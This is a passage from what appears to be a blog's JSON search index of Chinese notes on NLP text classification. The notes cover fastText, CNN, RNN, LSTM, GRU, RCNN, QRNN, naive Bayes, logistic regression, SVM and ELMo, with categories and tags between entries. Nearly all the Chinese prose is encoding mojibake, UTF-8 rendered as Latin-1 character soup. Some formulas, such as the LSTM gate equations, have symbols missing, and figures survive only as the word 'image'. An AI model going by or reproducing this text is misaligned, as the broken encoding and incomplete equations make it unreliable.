fastTextä¸“æ³¨äºæ–‡æœ¬åˆ†ç±»ï¼Œåœ¨è®¸å¤šæ ‡å‡†é—®é¢˜ä¸Šæœ‰è¾ƒå¥½çš„è¡¨ç°ï¼ˆä¾‹å¦‚æ–‡æœ¬å€¾å‘æ€§åˆ†ææˆ–æ ‡ç­¾é¢„æµ‹ï¼‰ã€‚ â€‹ fastText æ¨¡å‹è¾“å…¥ä¸€ä¸ªè¯çš„åºåˆ—ï¼ˆä¸€æ®µæ–‡æœ¬æˆ–è€…ä¸€å¥è¯)ï¼Œè¾“å‡ºè¿™ä¸ªè¯åºåˆ—å±äºä¸åŒç±»åˆ«çš„æ¦‚ç‡ã€‚ â€‹ åºåˆ—ä¸­çš„è¯å’Œè¯ç»„ç»„æˆç‰¹å¾å‘é‡ï¼Œç‰¹å¾å‘é‡é€šè¿‡çº¿æ€§å˜æ¢æ˜ å°„åˆ°ä¸­é—´å±‚ï¼Œä¸­é—´å±‚å†æ˜ å°„åˆ°æ ‡ç­¾ã€‚ fastText åœ¨é¢„æµ‹æ ‡ç­¾æ—¶ä½¿ç”¨äº†éçº¿æ€§æ¿€æ´»å‡½æ•°ï¼Œä½†åœ¨ä¸­é—´å±‚ä¸ä½¿ç”¨éçº¿æ€§æ¿€æ´»å‡½æ•°ã€‚ â€‹ fastText æ¨¡å‹æ¶æ„å’Œ Word2Vec ä¸­çš„ CBOW æ¨¡å‹å¾ˆç±»ä¼¼ã€‚ä¸åŒä¹‹å¤„åœ¨äºï¼ŒfastText é¢„æµ‹æ ‡ç­¾ï¼Œè€Œ CBOW æ¨¡å‹é¢„æµ‹ä¸­é—´è¯ã€‚ â€‹ åŸºæœ¬æ¡†æ¶ï¼š å­—ç¬¦n-gram â€‹ å°†è¾“å…¥åºåˆ—ï¼ˆä¸€æ•´å¥è¯ï¼Œè€Œä¸æ˜¯CBOWçš„çª—å£è¾“å…¥ï¼‰ï¼Œè¿›è¡Œå­—ç¬¦n-gramã€‚n-gramä¸€å®šç¨‹åº¦ä¸Šå…‹æœäº†CBOWè¿™ç±»bag of wordsæ¨¡å‹æ— è§†äº†è¯­åºçš„ç¼ºç‚¹ã€‚ â€‹ ç½•è§è¯ä»ç„¶å¯ä»¥è¢«åˆ†è§£æˆå­—ç¬¦n-gramã€‚ 123apple &gt;&gt;&gt; â€œ&lt;apâ€, â€œappâ€, â€œpplâ€, â€œpleâ€, â€œle&gt;â€ &lt;è¡¨ç¤ºå‰ç¼€ï¼Œ&gt;è¡¨ç¤ºåç¼€ â€‹ éšè—è¡¨å¾åœ¨ä¸åŒç±»åˆ«æ‰€æœ‰åˆ†ç±»å™¨ä¸­è¿›è¡Œå…±äº«ï¼Œä½¿å¾—æ–‡æœ¬ä¿¡æ¯åœ¨ä¸åŒç±»åˆ«ä¸­èƒ½å¤Ÿå…±åŒä½¿ç”¨ã€‚ å±‚æ¬¡ Softmax åˆ†ç±» â€‹ åŸºæœ¬æ€æƒ³æ˜¯ä½¿ç”¨æ ‘çš„å±‚çº§ç»“æ„æ›¿ä»£æ‰å¹³åŒ–çš„æ ‡å‡†Softmaxï¼Œä½¿å¾—åœ¨è®¡ç®— P(y=j) æ—¶ï¼Œåªéœ€è®¡ç®—ä¸€æ¡è·¯å¾„ä¸Šçš„æ‰€æœ‰èŠ‚ç‚¹çš„æ¦‚ç‡å€¼ï¼Œæ— éœ€åœ¨æ„å…¶å®ƒçš„èŠ‚ç‚¹ã€‚ â€‹ å±‚æ¬¡ Softmaxçš„åŸç†åœ¨æ–‡æœ¬è¡¨ç¤ºç¬”è®°éƒ¨åˆ†ï¼Œåœ¨word2vecçš„ä¼˜åŒ–éƒ¨åˆ†è¿›è¡Œäº†è¯´æ˜ã€‚ â€‹ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä½¿ç”¨fastTextè¿›è¡Œæ–‡æœ¬åˆ†ç±»çš„åŒæ—¶ä¹Ÿä¼šäº§ç”Ÿè¯çš„embeddingï¼Œå³embeddingæ˜¯fastTextåˆ†ç±»çš„äº§ç‰©ã€‚ â€‹ ç”¨å•è¯çš„embeddingå åŠ è·å¾—çš„æ–‡æ¡£å‘é‡ï¼Œè¯å‘é‡çš„é‡è¦ç‰¹ç‚¹å°±æ˜¯å‘é‡çš„è·ç¦»å¯ä»¥ç”¨æ¥è¡¡é‡å•è¯é—´çš„è¯­ä¹‰ç›¸ä¼¼ç¨‹åº¦ï¼Œäºæ˜¯ï¼Œåœ¨fastTextæ¨¡å‹ä¸­ï¼Œè¿™ä¸¤æ®µåŒç±»æ–‡æœ¬çš„å‘é‡åº”è¯¥æ˜¯ç›¸ä¼¼çš„ã€‚ CNN â€‹ å·ç§¯ç¥ç»ç½‘ç»œç»å¸¸ç”¨æ¥å¤„ç†å…·æœ‰ç±»ä¼¼ç½‘æ ¼æ‹“æ‰‘ç»“æ„ï¼ˆgrid-like topologyï¼‰çš„æ•°æ®ã€‚ â€‹ åº”ç”¨äºæ–‡æœ¬å¤„ç†å¾ˆç®€å•ã€‚ RNN \\[ h_t=f(x_t,h_{t-1})=\\sigma(W_{xh}x_t+W_{hh}h_{t-1}+b_h) \\] â€‹ å…¶ä¸­\\(W_{xh}\\)æ˜¯è¾“å…¥åˆ°éšå±‚çš„çŸ©é˜µå‚æ•°ï¼Œ\\(W_{hh}\\)æ˜¯éšå±‚åˆ°éšå±‚çš„çŸ©é˜µå‚æ•°ï¼Œ\\(b_h\\)ä¸ºéšå±‚çš„åç½®å‘é‡ï¼ˆbiasï¼‰å‚æ•°ï¼Œ\\(\\sigma\\)ä¸º\\(sigmoid\\)å‡½æ•°ã€‚ â€‹ ä¸€èˆ¬æå–æœ€åä¸€ä¸ªæ—¶åˆ»çš„éšå±‚çŠ¶æ€ä½œä¸ºå¥å­è¡¨ç¤ºè¿›è€Œä½¿ç”¨åˆ†ç±»æ¨¡å‹ã€‚ LSTM â€‹ LSTMå¢åŠ äº†è®°å¿†å•å…ƒğ‘ã€è¾“å…¥é—¨ğ‘–ã€é—å¿˜é—¨ğ‘“åŠè¾“å‡ºé—¨ğ‘œã€‚è¿™äº›é—¨åŠè®°å¿†å•å…ƒç»„åˆèµ·æ¥å¤§å¤§æå‡äº†å¾ªç¯ç¥ç»ç½‘ç»œå¤„ç†é•¿åºåˆ—æ•°æ®çš„èƒ½åŠ›ã€‚ \\(i_t = \\sigma{(W_{xi}x_t+W_{hi}h_{t-1}+b_i)}\\) $ f_t = (W_{xf}x_t+W_{hf}h_{t-1}+b_f) $ $ c_t = f_t c_{t-1}+i_t tanh(W_{xc}x_t+W_{hc}h_{t-1}+b_c) $ $o_t = (W_{xo}x_t+W_{ho}h_{t-1}+b_o) $ $ h_t = o_t tanh(c_t) $ â€‹ å…¶ä¸­ï¼Œ\\(i_t, f_t, c_t, o_t\\)åˆ†åˆ«è¡¨ç¤ºè¾“å…¥é—¨ï¼Œé—å¿˜é—¨ï¼Œè®°å¿†å•å…ƒåŠè¾“å‡ºé—¨çš„å‘é‡å€¼ï¼Œå¸¦è§’æ ‡çš„\\(W\\)åŠ\\(b\\)ä¸ºæ¨¡å‹å‚æ•°ï¼Œ\\(tanh\\)ä¸ºåŒæ›²æ­£åˆ‡å‡½æ•°ï¼Œ\\(\\odot\\)è¡¨ç¤ºé€å…ƒç´ ï¼ˆelementwiseï¼‰çš„ä¹˜æ³•æ“ä½œã€‚ â€‹ è¾“å…¥é—¨æ§åˆ¶ç€æ–°è¾“å…¥è¿›å…¥è®°å¿†å•å…ƒ\\(c\\)çš„å¼ºåº¦ï¼Œé—å¿˜é—¨æ§åˆ¶ç€è®°å¿†å•å…ƒç»´æŒä¸Šä¸€æ—¶åˆ»å€¼çš„å¼ºåº¦ï¼Œè¾“å‡ºé—¨æ§åˆ¶ç€è¾“å‡ºè®°å¿†å•å…ƒçš„å¼ºåº¦ã€‚ â€‹ ä¸‰ç§é—¨çš„è®¡ç®—æ–¹å¼ç±»ä¼¼ï¼Œä½†æœ‰ç€å®Œå…¨ä¸åŒçš„å‚æ•°ï¼Œå®ƒä»¬å„è‡ªä»¥ä¸åŒçš„æ–¹å¼æ§åˆ¶ç€è®°å¿†å•å…ƒ\\(c\\)ï¼š Forget Gateï¼š Input Gateï¼š æ›´æ–°Cell stateï¼š Output Gateï¼š â€‹ å›¾ä¸­å¸¦æœ‰æ–¹å—çš„çº¿ï¼Œæ²¡æœ‰åœ¨è®¡ç®—ä¸­ç›´æ¥å…¬å¼æ±‚è§£ï¼Œså³cell stateï¼Œé€šè¿‡hidden stateçš„è®¡ç®—ï¼Œä»è€Œè¿›è¡Œä¿¡æ¯ä¼ é€’ã€‚è¯¦ç»†å†…å®¹æŸ¥æ‰¾ç¥ç»ç½‘ç»œç¬”è®°ã€‚ â€‹ GRU å°†å¿˜è®°é—¨å’Œè¾“å…¥é—¨åˆå¹¶æˆä¸ºä¸€ä¸ªå•ä¸€çš„æ›´æ–°é—¨ åŒæ—¶åˆå¹¶äº†æ•°æ®å•å…ƒçŠ¶æ€å’Œéšè—çŠ¶æ€ ç»“æ„æ¯”LSTMçš„ç»“æ„æ›´åŠ ç®€å• RCNN â€‹ â€‹ å·ç§¯å±‚å»ºç«‹åœ¨ä¸€ä¸ªBiRNNæ¨¡å‹ä¹‹ä¸Šï¼Œé€šè¿‡æ­£å‘å’Œåå‘å¾ªç¯æ¥æ„é€ ä¸€ä¸ªå•è¯çš„ä¸‹æ–‡å’Œä¸Šæ–‡ï¼Œç„¶åè¾“å…¥CNNï¼Œå¦‚ä¸‹å¼ï¼š â€‹ å¾—åˆ°å•è¯çš„ä¸Šä¸‹æ–‡è¡¨ç¤ºä¹‹åï¼Œç”¨æ‹¼æ¥çš„æ–¹å¼æ¥è¡¨ç¤ºè¿™ä¸ªå•è¯. â€‹ ç„¶åé€šè¿‡max poolingå±‚å’Œå…¨è¿æ¥å±‚ï¼Œå¾—åˆ°æœ€åçš„è¾“å‡ºã€‚è¿™ä¸€éƒ¨åˆ†ç›¸å½“äºæ–‡æœ¬è¡¨ç¤ºçš„å­¦ä¹ ã€‚ â€‹ å°†è¯¥è¯å‘é‡æ”¾å…¥ä¸€ä¸ªå•å±‚ç¥ç»ç½‘ç»œä¸­ï¼Œå¾—åˆ°æ‰€è°“çš„æ½œè¯­ä¹‰å‘é‡ï¼ˆlatent semantic vectorï¼‰ï¼Œè¿™é‡Œå·ç§¯å±‚çš„è®¡ç®—ç»“æŸäº†ï¼Œæ—¶é—´å¤æ‚åº¦ä»æ˜¯O(n)ã€‚æ¥ä¸‹æ¥è¿›è¡Œæ± åŒ–å±‚ï¼Œè¿™é‡Œé‡‡ç”¨max-poolingå¯ä»¥å°†å‘é‡ä¸­æœ€å¤§çš„ç‰¹å¾æå–å‡ºæ¥ï¼Œä»è€Œè·å–åˆ°æ•´ä¸ªæ–‡æœ¬çš„ä¿¡æ¯ã€‚æ± åŒ–è¿‡ç¨‹æ—¶é—´å¤æ‚åº¦ä¹Ÿæ˜¯O(n)ï¼Œæ‰€ä»¥æ•´ä¸ªæ¨¡å‹çš„æ—¶é—´å¤æ‚åº¦æ˜¯O(n)ã€‚å¾—åˆ°æ–‡æœ¬ç‰¹å¾å‘é‡ä¹‹åï¼Œè¿›è¡Œåˆ†ç±»ã€‚ Quasi-RNN â€‹ æ¡†å›¾æ˜¾ç¤ºäº†QRNNçš„è®¡ç®—ç»“æ„ä¸å…¸å‹å€¼çš„æ¯”è¾ƒLSTMå’ŒCNNæ¶æ„ã€‚ çº¢è‰²è¡¨ç¤ºå·ç§¯æˆ–çŸ©é˜µä¹˜æ³•ï¼› è¿ç»­çš„å—æ„å‘³ç€è¿™äº›è®¡ç®—å¯ä»¥å¹¶è¡Œè¿›è¡Œã€‚ è“è‰²è¡¨ç¤ºæ— å‚æ•°åŠŸèƒ½æ²¿é€šé“/ç‰¹å¾ç»´åº¦å¹¶è¡Œè¿è¡Œçš„å¯¹è±¡ã€‚ LSTMå¯ä»¥åˆ†è§£ä¸ºï¼ˆçº¢è‰²ï¼‰çº¿æ€§å—å’Œï¼ˆè“è‰²ï¼‰element-wiseéƒ¨åˆ†ï¼Œä½†æ¯ä¸ªæ—¶é—´æ­¥çš„è®¡ç®—ä»å–å†³äºä¸Šä¸€ä¸ªæ—¶é—´æ­¥çš„ç»“æœã€‚ â€‹ fo-PoolæŒ‡çš„æ˜¯ä»¥ä¸‹å…¬å¼ï¼ŒåŒ…æ‹¬forget å’Œ output çš„hè®¡ç®—æ–¹å¼ è€Œä¸Šå›¾ä¸­ â€‹","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"fastText","slug":"fastText","permalink":"https://racleray.github.io/tags/fastText/"},{"name":"CNN","slug":"CNN","permalink":"https://racleray.github.io/tags/CNN/"},{"name":"RNN","slug":"RNN","permalink":"https://racleray.github.io/tags/RNN/"}]},{"title":"æ–‡æœ¬åˆ†ç±»ä¼ ç»Ÿæœºå™¨å­¦ä¹ æ–¹æ³•","slug":"æ–‡æœ¬åˆ†ç±»ä¼ ç»Ÿæœºå™¨å­¦ä¹ æ–¹æ³•","date":"2020-07-06T16:25:53.000Z","updated":"2023-08-07T11:54:31.043Z","comments":true,"path":"posts/f4b85348.html","link":"","permalink":"https://racleray.github.io/posts/f4b85348.html","excerpt":"ç®€è¦è®°å½•äº†æœ´ç´ è´å¶æ–¯ã€é€»è¾‘å›å½’ã€SVMç­‰æœºå™¨å­¦ä¹ åˆ†ç±»æ¨¡å‹ã€‚","text":"æœ´ç´ è´å¶æ–¯æ¨¡å‹ä¸ä¸­æ–‡æ–‡æœ¬åˆ†ç±» \\[ P(Y|X)=\\frac{P(X|Y)P(Y)}{P(X)} \\] \\[ P(Y,X) = P(Y|X)P(X)=P(X|Y)P(Y) \\] â€‹ æ¡ä»¶ç‹¬ç«‹å‡è®¾çš„ä¸€ä¸ªç¼ºé™·æ˜¯ï¼Œå¤±å»äº†è¯è¯­ä¹‹é—´çš„é¡ºåºä¿¡æ¯ã€‚è¿™å°±ç›¸å½“äºæŠŠæ‰€æœ‰çš„è¯æ±‡æ‰”è¿›åˆ°ä¸€ä¸ªè¢‹å­é‡Œéšä¾¿æ…å’Œï¼Œè´å¶æ–¯éƒ½è®¤ä¸ºå®ƒä»¬ä¸€æ ·ã€‚å› æ­¤è¿™ç§æƒ…å†µä¹Ÿç§°ä½œè¯è¢‹æ¨¡å‹(bag of words)ã€‚ ä¼˜åŒ– å–å¯¹æ•° è½¬æ¢ä¸ºæƒé‡ï¼Œæ¯ä¸ªè¯ä¸€ä¸ªé‡è¦åº¦ï¼Œè€Œä¸æ˜¯è®¡æ•° é€‰å–top kå…³é”®è¯ åˆ†å‰²æ ·æœ¬ï¼Œæ ¹æ®æ–‡æœ¬é•¿åº¦é€‰æ‹©ä¸åŒæ•°é‡çš„å…³é”®è¯æ•°é‡ï¼Œæ–‡æœ¬é•¿æ—¶é€‰å–å¤šä¸€äº› ä½ç½®æƒé‡ï¼šæ¯”å¦‚åœ¨æ ‡é¢˜ä¸­çš„å…³é”®è¯ï¼Œæƒé‡å¤§ä¸€äº› Logistic Regression â€‹ Logistic å›å½’å¹¶éæœ€å¼ºå¤§çš„åˆ†ç±»ç®—æ³•ï¼Œå®ƒå¯ä»¥å¾ˆå®¹æ˜“åœ°è¢«æ›´ä¸ºå¤æ‚çš„ç®—æ³•æ‰€è¶…è¶Šï¼Œå¦ä¸€ä¸ªç¼ºç‚¹æ˜¯å®ƒé«˜åº¦ä¾èµ–æ­£ç¡®çš„æ•°æ®è¡¨ç¤ºã€‚ä½†æ˜¯å…¶è®¡ç®—æ•ˆç‡æ˜¯ç›¸å¯¹è¾ƒé«˜çš„ã€‚ä¸èƒ½ç”¨ logistic å›å½’æ¥è§£å†³éçº¿æ€§åˆ†ç±»é—®é¢˜ï¼Œå› ä¸ºå®ƒçš„å†³ç­–è¾¹ç•Œæ˜¯çº¿æ€§çš„ã€‚ SVM â€‹ æ‰¾åˆ°å…·æœ‰æœ€å°é—´éš”çš„æ ·æœ¬ç‚¹ï¼Œç„¶åæ‹Ÿåˆå‡ºä¸€ä¸ªåˆ°è¿™äº›æ ·æœ¬ç‚¹è·ç¦»å’Œæœ€å¤§çš„çº¿æ®µ/å¹³é¢ã€‚ â€‹ ç›®æ ‡å‡½æ•°ï¼š image â€‹ ä¼˜åŒ–é—®é¢˜å¯æ¨å¯¼å‡ºï¼šã€è¿‡ç¨‹è§æœºå™¨å­¦ä¹ ç¬”è®°ã€‘ image â€‹ å¾—åˆ°å›å½’ç³»æ•°ï¼š image å®éªŒ notebook","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"classification","slug":"classification","permalink":"https://racleray.github.io/tags/classification/"},{"name":"machine learning","slug":"machine-learning","permalink":"https://racleray.github.io/tags/machine-learning/"}]},{"title":"æ–‡æœ¬è¡¨ç¤ºè¿›é˜¶","slug":"æ–‡æœ¬è¡¨ç¤ºè¿›é˜¶","date":"2020-07-06T15:29:30.000Z","updated":"2023-08-07T11:54:31.046Z","comments":true,"path":"posts/ec2b8b1f.html","link":"","permalink":"https://racleray.github.io/posts/ec2b8b1f.html","excerpt":"è®°å½•é¢„è®­ç»ƒè¯­è¨€æ¨¡å‹çš„ä¸€äº›æ€»ç»“ï¼ŒåŒ…æ‹¬ä»ELMoåˆ°BERTå†åˆ°XLNetçš„å°ç»“ã€‚æ²¡æœ‰ç»†åŒ–ï¼Œæœ‰ç‚¹å†—é•¿ã€‚","text":"æ–‡æœ¬è¡¨ç¤ºè¿›é˜¶ image â€‹ é¢„è®­ç»ƒè¿‡ç¨‹æ˜¯åšå›¾åƒæˆ–è€…è§†é¢‘é¢†åŸŸçš„ä¸€ç§æ¯”è¾ƒå¸¸è§„çš„åšæ³•ï¼Œè¿™ç§åšæ³•å¾ˆæœ‰æ•ˆï¼Œèƒ½æ˜æ˜¾ä¿ƒè¿›åº”ç”¨çš„æ•ˆæœã€‚ â€‹ ä¸¤ç§åšæ³•ï¼Œä¸€ç§æ˜¯æµ…å±‚åŠ è½½çš„å‚æ•°åœ¨è®­ç»ƒCä»»åŠ¡è¿‡ç¨‹ä¸­ä¸åŠ¨ï¼Œè¿™ç§æ–¹æ³•è¢«ç§°ä¸ºâ€œFrozenâ€;å¦å¤–ä¸€ç§æ˜¯åº•å±‚ç½‘ç»œå‚æ•°å°½ç®¡è¢«åˆå§‹åŒ–äº†ï¼Œåœ¨Cä»»åŠ¡è®­ç»ƒè¿‡ç¨‹ä¸­ä»ç„¶éšç€è®­ç»ƒçš„è¿›ç¨‹ä¸æ–­æ”¹å˜ï¼Œè¿™ç§ä¸€èˆ¬å«â€œFine-Tuningâ€ã€‚ image â€‹ ç”¨ImageNetæ¥åšç½‘ç»œçš„é¢„è®­ç»ƒï¼Œä¸»è¦æœ‰ä¸¤ç‚¹ï¼Œä¸€æ–¹é¢ImageNetæ˜¯å›¾åƒé¢†åŸŸé‡Œæœ‰å¾ˆå¤šäº‹å…ˆæ ‡æ³¨å¥½è®­ç»ƒæ•°æ®çš„æ•°æ®é›†åˆï¼Œæ˜¯ä¸ªå¾ˆå¤§çš„ä¼˜åŠ¿ï¼Œé‡è¶Šå¤§è®­ç»ƒå‡ºçš„å‚æ•°è¶Šé è°±ï¼›å¦å¤–ä¸€æ–¹é¢å› ä¸ºImageNetæœ‰1000ç±»ï¼Œç±»åˆ«å¤šï¼Œæ‰€ä»¥é€šç”¨æ€§å¥½ã€‚ â€‹ NLPç›¸å¯¹å›¾åƒçš„ç‰¹ç‚¹åœ¨äºï¼Œè¯ä½œä¸ºNLPçš„åŸºæœ¬è¦ç´ ï¼Œæ¯”åƒç´ çš„æŠ½è±¡ç¨‹åº¦æ›´é«˜ï¼Œå·²ç»åŠ å…¥äº†äººç±»æ•°ä¸‡å¹´è¿›åŒ–è€Œæ¥çš„æŠ½è±¡ç»éªŒã€‚ â€‹ é¢„è®­ç»ƒè¯­è¨€æ¨¡å‹çš„ä¼˜åŠ¿åœ¨äºï¼š è¿‘ä¹æ— é™é‡çš„ä¼˜è´¨æ•°æ® æ— éœ€äººå·¥æ ‡æ³¨ ä¸€æ¬¡å­¦ä¹ å¤šæ¬¡å¤ç”¨ å­¦ä¹ åˆ°çš„è¡¨å¾å¯åœ¨å¤šä¸ªä»»åŠ¡ä¸­è¿›è¡Œå¿«é€Ÿè¿ç§» â€‹ word2vecçš„é—®é¢˜ï¼šWord Embeddingæœ¬è´¨ä¸Šæ˜¯ä¸ªé™æ€çš„ã€‚ä¸è®ºæ–°å¥å­ä¸Šä¸‹æ–‡å•è¯æ˜¯ä»€ä¹ˆï¼Œè¿™ä¸ªå•è¯çš„Word Embeddingä¸ä¼šè·Ÿç€ä¸Šä¸‹æ–‡åœºæ™¯çš„å˜åŒ–è€Œæ”¹å˜ã€‚è¿™å°±æ˜¯é—®é¢˜æ‰€åœ¨ï¼Œå¤šä¹‰æ€§çš„æ¶ˆå¤±ã€‚ ELMoï¼šEmbedding from Language Models â€‹ ELMoé‡‡ç”¨äº†å…¸å‹çš„ä¸¤é˜¶æ®µè¿‡ç¨‹ï¼Œ ç¬¬ä¸€ä¸ªé˜¶æ®µæ˜¯åˆ©ç”¨è¯­è¨€æ¨¡å‹è¿›è¡Œé¢„è®­ç»ƒï¼› ç¬¬äºŒä¸ªé˜¶æ®µæ˜¯åœ¨åšä¸‹æ¸¸ä»»åŠ¡æ—¶ï¼Œä»é¢„è®­ç»ƒç½‘ç»œä¸­æå–å¯¹åº”å•è¯çš„ç½‘ç»œå„å±‚çš„Word Embeddingä½œä¸ºæ–°ç‰¹å¾è¡¥å……åˆ°ä¸‹æ¸¸ä»»åŠ¡ä¸­ã€‚ image ç»“æ„ â€‹ ELMo ä¸ºäº†åˆ©ç”¨æ— æ ‡è®°æ•°æ®ï¼Œä½¿ç”¨äº†è¯­è¨€æ¨¡å‹ï¼š â€‹ åŸºæœ¬æ¡†æ¶æ˜¯ä¸€ä¸ªåŒå±‚çš„ Bi-LSTMï¼Œä¸è¿‡åœ¨ç¬¬ä¸€å±‚å’Œç¬¬äºŒå±‚ä¹‹é—´åŠ å…¥äº†ä¸€ä¸ªæ®‹å·®ç»“æ„ï¼ˆä¸€èˆ¬æ¥è¯´ï¼Œæ®‹å·®ç»“æ„èƒ½è®©è®­ç»ƒè¿‡ç¨‹æ›´ç¨³å®šï¼‰ã€‚åšé¢„è®­ç»ƒçš„æ—¶å€™ï¼ŒELMo çš„è®­ç»ƒç›®æ ‡å‡½æ•°ä¸º: \\[ \\sum_{k=1}^{N} \\log p\\left(t_{k} | t_{1}, \\ldots, t_{k-1}\\right)+\\log p\\left(t_{k} | t_{k+1}, \\ldots, t_{N}\\right) \\] â€‹ Bi-LSTMï¼Œä¸€ç»„æ­£å‘ï¼Œä¸€ç»„åå‘ã€‚\\(t_k\\)ä¹‹å‰çš„å•è¯åºåˆ—Context-beforeç§°ä¸ºä¸Šæ–‡ï¼Œä¹‹åçš„å•è¯åºåˆ—Context-afterç§°ä¸ºä¸‹æ–‡ã€‚ image è¾“å…¥å±‚å’Œè¾“å‡ºå±‚æ”¹è¿› â€‹ ELMo å€Ÿé‰´äº† 2016 å¹´ Google Brain çš„ Rafal Jozefowicz ç­‰äººå‘è¡¨çš„ Exploring the Limits of Language Modelingã€‚è¾“å…¥å±‚å’Œè¾“å‡ºå±‚ä¸å†æ˜¯ wordï¼Œè€Œæ˜¯å˜ä¸ºäº†ä¸€ä¸ª char-based CNN ç»“æ„ã€‚ è¾“å‡ºå±‚ï¼š â€‹ å°†CBOWä¸­çš„æ™®é€šsoftmax: \\[ P\\left(w_{t} | c_{t}\\right)=\\frac{\\exp \\left(e^{\\prime}\\left(w_{t}\\right)^{T} x\\right)}{\\sum_{i=1}^{|V|} \\exp \\left(e^{\\prime}\\left(w_{i}\\right)^{T} x\\right)}, x=\\sum_{i \\in c} e\\left(w_{i}\\right) \\] â€‹ è½¬æ¢ä¸ºï¼š \\[ p\\left(t_{k} | t_{1}, \\ldots, t_{k-1}\\right)=\\frac{\\exp \\left(C N N\\left(t_{k}\\right)^{T} h\\right)}{\\sum_{i=1}^{|V|} \\exp \\left(C N N\\left(t_{i}\\right)^{T} h\\right)}, h=L S T M\\left(t_{k} | t_{1}, \\ldots, t_{k-1}\\right) \\] â€‹ char-based CNN æ¨¡å‹æ˜¯ç°æˆå·²æœ‰çš„ï¼Œå¯¹äºä»»æ„ä¸€ä¸ªç›®æ ‡è¯éƒ½å¯ä»¥å¾—åˆ°ä¸€ä¸ªå‘é‡è¡¨ç¤º CNN(\\(t_k\\)) ã€‚åˆ©ç”¨ CNN è§£å†³æœ‰ä¸‰ç‚¹ä¼˜åŠ¿: CNN èƒ½å‡å°‘åš Softmax æ—¶å…¨è¿æ¥å±‚ä¸­çš„å¿…é¡»è¦æœ‰çš„ |V|* h çš„å‚æ•°è§„æ¨¡ï¼Œåªéœ€ä¿æŒ CNN å†…éƒ¨çš„å‚æ•°å¤§å°å³å¯ã€‚ (PS: å·ç§¯æ ¸å‚æ•°å…±äº«) CNN å¯ä»¥è§£å†³ OOV ï¼ˆOut-of-Vocabularyï¼‰é—®é¢˜ï¼Œè¿™ä¸ªåœ¨ç¿»è¯‘é—®é¢˜ä¸­å°¤å…¶å¤´ç–¼ åœ¨é¢„æµ‹é˜¶æ®µï¼ŒCNN å¯¹äºæ¯ä¸€ä¸ªè¯å‘é‡çš„è®¡ç®—å¯ä»¥é¢„å…ˆåšå¥½ï¼Œæ›´èƒ½å¤Ÿå‡è½» inference é˜¶æ®µçš„è®¡ç®—å‹åŠ›ã€‚ è¾“å…¥å±‚ï¼š â€‹ ç›¸ä¼¼ç»“æ„ï¼Œä¸åŒè¾“å‡ºã€‚è®­ç»ƒæ—¶é—´ä¼šç•¥å¾®å¢åŠ ï¼Œå› ä¸ºåŸæ¥çš„ look-up æ“ä½œå¯ä»¥åšåˆ°æ›´å¿«ä¸€äº›ã€‚ â€‹ å¥å­ä¸­æ¯ä¸ªå•è¯éƒ½èƒ½å¾—åˆ°å¯¹åº”çš„ä¸‰ä¸ªEmbedding: â€‹ æœ€åº•å±‚æ˜¯å•è¯çš„Word Embeddingï¼Œå¾€ä¸Šèµ°æ˜¯ç¬¬ä¸€å±‚åŒå‘LSTMä¸­å¯¹åº”å•è¯ä½ç½®çš„Embeddingï¼Œè¿™å±‚ç¼–ç å•è¯çš„å¥æ³•ä¿¡æ¯æ›´å¤šä¸€äº›ï¼›å†å¾€ä¸Šèµ°æ˜¯ç¬¬äºŒå±‚LSTMä¸­å¯¹åº”å•è¯ä½ç½®çš„Embeddingï¼Œè¿™å±‚ç¼–ç å•è¯çš„è¯­ä¹‰ä¿¡æ¯æ›´å¤šä¸€äº›ã€‚ ç»“æœï¼š â€‹ æœ‰ä¸‰å±‚çš„è¯å‘é‡å¯ä»¥åˆ©ç”¨ï¼š è¾“å…¥å±‚ CNN çš„è¾“å‡ºï¼Œå³æ˜¯ LSTM çš„è¾“å…¥å‘é‡ï¼Œ ç¬¬ä¸€å±‚ LSTM çš„hidden stateï¼šè¿™å±‚ç¼–ç å•è¯çš„å¥æ³•ä¿¡æ¯æ›´å¤šä¸€äº› ç¬¬äºŒå±‚çš„hidden stateï¼šè¿™å±‚ç¼–ç å•è¯çš„è¯­ä¹‰ä¿¡æ¯æ›´å¤šä¸€äº› LSTM æ˜¯åŒå‘çš„ï¼Œå› æ­¤å¯¹äºä»»æ„ä¸€ä¸ªè¯ï¼Œå¦‚æœ LSTM çš„å±‚æ•°ä¸º L çš„è¯ï¼Œæ€»å…±å¯è·å¾—çš„å‘é‡ä¸ªæ•°ä¸º 2L+1ã€‚ â€‹ å¯¹äºæ¯ä¸€ä¸ªè¯ï¼Œå¯ä»¥æ ¹æ®ä¸‹é¢çš„å¼å­å¾—åˆ°å®ƒçš„å‘é‡ï¼Œå…¶ä¸­ Î³ æ˜¯ä¸€ä¸ª scale å› å­ï¼ŒåŠ å…¥è¿™ä¸ªå› å­ä¸»è¦æ˜¯æƒ³å°† ELMo çš„å‘é‡ä¸å…·ä½“ä»»åŠ¡çš„å‘é‡åˆ†å¸ƒæ‹‰å¹³åˆ°åŒä¸€ä¸ªåˆ†å¸ƒæ°´å¹³ï¼š \\[ \\mathbf{E} \\mathbf{L} \\mathbf{M} \\mathbf{o} k^{t a s k}=\\gamma^{t a s k} \\sum j= s_{j}^{t a s k} \\mathbf{h}_{k, j} \\] \\(\\mathbf{h}_{k, j}\\)ä¾¿æ˜¯é’ˆå¯¹æ¯ä¸€å±‚çš„è¾“å‡ºå‘é‡ï¼Œåˆ©ç”¨ä¸€ä¸ª softmax çš„å‚æ•°æ¥å­¦ä¹ ä¸åŒå±‚çš„æƒå€¼å‚æ•°\\(s_{j}^{t a s k}\\)ï¼Œå› ä¸ºä¸åŒä»»åŠ¡éœ€è¦çš„è¯è¯­æ„ä¹‰ç²’åº¦ä¹Ÿä¸ä¸€è‡´ï¼Œä¸€èˆ¬è®¤ä¸ºæµ…å±‚çš„è¡¨å¾æ¯”è¾ƒå€¾å‘äºå¥æ³•ï¼Œè€Œé«˜å±‚è¾“å‡ºçš„å‘é‡æ¯”è¾ƒå€¾å‘äºè¯­ä¹‰ä¿¡æ¯ã€‚ å› æ­¤é€šè¿‡ä¸€ä¸ª softmax çš„ç»“æ„è®©ä»»åŠ¡è‡ªåŠ¨å»å­¦ä¹ å„å±‚ä¹‹é—´çš„æƒé‡ã€‚ 